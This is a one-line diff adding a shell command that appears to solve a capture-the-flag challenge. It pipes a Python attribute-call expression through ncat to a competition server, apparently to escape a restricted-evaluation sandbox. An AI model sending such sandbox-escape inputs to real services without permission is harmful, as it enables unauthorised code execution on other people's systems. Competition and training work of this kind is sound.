@@ -1,0 +1,1 @@
+echo "getattr(p,dir(p)[0])()"|ncat ppc1.chal.ctf.westerns.tokyo 10000
